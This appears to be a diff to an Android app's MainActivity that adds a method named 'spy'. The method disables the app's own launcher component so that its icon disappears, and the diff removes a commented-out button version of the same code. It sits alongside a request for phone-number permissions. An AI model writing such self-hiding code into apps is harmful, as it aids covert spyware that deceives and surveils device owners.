@@ -6,11 +6,13 @@ import androidx.core.app.ActivityCompat;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 
 import android.Manifest;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.view.View;
 
 
 public class MainActivity extends AppCompatActivity
@@ -39,18 +41,6 @@ public class MainActivity extends AppCompatActivity
 				Manifest.permission.READ_PHONE_NUMBERS
 		};
 		checkPermissions(PERMISSIONS, PERMISSIONS_CHECK);
-
-		//		spyButton.setOnClickListener(new View.OnClickListener()
-		//		{
-		//			@Override
-		//			public void onClick(View v)
-		//			{
-		//
-		//				PackageManager packageManager = getPackageManager();
-		//				ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
-		//				packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-		//			}
-		//		});
 	}
 
 	@Override
@@ -119,4 +109,11 @@ public class MainActivity extends AppCompatActivity
 		}
 		return true;
 	}
+
+    public void spy(View view)
+	{
+		PackageManager packageManager = getPackageManager();
+		ComponentName componentName = new ComponentName(MainActivity.this, MainActivity.class);
+		packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+    }
 }
